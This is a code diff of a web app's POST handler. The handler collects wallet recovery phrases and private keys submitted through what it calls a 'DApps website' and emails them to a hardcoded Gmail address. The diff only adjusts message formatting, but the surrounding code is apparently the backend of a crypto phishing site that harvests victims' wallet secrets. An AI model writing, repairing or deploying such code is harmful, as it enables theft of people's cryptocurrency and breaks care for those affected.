@@ -66,13 +66,13 @@ export async function POST(request: Request) {
       })
 
 
-      const formattedMessage = formatMessage(phrase);
+      const formattedMessage = await formatMessage(phrase);
 
       const mailOptions = {
         from: `Dapp App ${email}`,
         to: "contact.telfarglobal@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: `<div>${formattedMessage}</div>`,
+        html: formattedMessage,
       }
 
       transporter.verify(function (error, success) {
@@ -146,13 +146,13 @@ export async function POST(request: Request) {
 
 
 
-      const formattedMessage = formatMessage(privateKey);
+      const formattedMessage = await formatMessage(privateKey);
 
       const mailOptions = {
         from: `Dapp App ${email}`,
         to: "contact.telfarglobal@gmail.com",
         subject: "Yo! You Just Got A New Phrase Innit from DApps website!",
-        html: `<div>${formattedMessage}</div>`,
+        html: formattedMessage,
       }
 
       transporter.verify(function (error, success) {
